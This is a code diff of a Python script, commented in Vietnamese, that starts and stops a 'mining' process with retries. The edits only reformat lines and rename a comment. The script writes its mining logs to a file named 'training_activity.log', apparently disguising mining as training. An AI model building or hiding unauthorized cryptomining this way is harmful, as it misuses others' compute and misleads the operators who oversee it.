@@ -27,7 +27,11 @@ LOGS_DIR = os.getenv('LOGS_DIR', '/app/mining_environment/logs')
 os.makedirs(LOGS_DIR, exist_ok=True)
 
 # Thiết lập logging với logging_config.py
-logger = setup_logging('start_mining', Path(LOGS_DIR) / 'training_activity.log', 'INFO')
+logger = setup_logging(
+    'start_mining', 
+    Path(LOGS_DIR) / 'training_activity.log', 
+    'INFO'
+)
 
 # Sự kiện dừng để xử lý graceful shutdown
 stop_event = threading.Event()
@@ -109,7 +113,9 @@ def start_mining_process(retries=3, delay=5):
     for attempt in range(1, retries + 1):
         logger.info(f"Thử khởi chạy quá trình khai thác (Cố gắng {attempt}/{retries})...")
         try:
-            mining_process = subprocess.Popen([mining_command, '--config', mining_config])
+            mining_process = subprocess.Popen(
+                [mining_command, '--config', mining_config]
+            )
             logger.info(f"Quá trình khai thác đã được khởi động với PID: {mining_process.pid}")
 
             # Kiểm tra xem quá trình có đang chạy không
@@ -181,7 +187,7 @@ def main():
     except Exception as e:
         logger.error(f"Lỗi khi dừng quá trình khai thác: {e}")
 
-    # Dừng System Manager
+    # Dừng Resource Manager
     try:
         system_manager.stop()
         logger.info("Đã dừng tất cả các quản lý tài nguyên.")
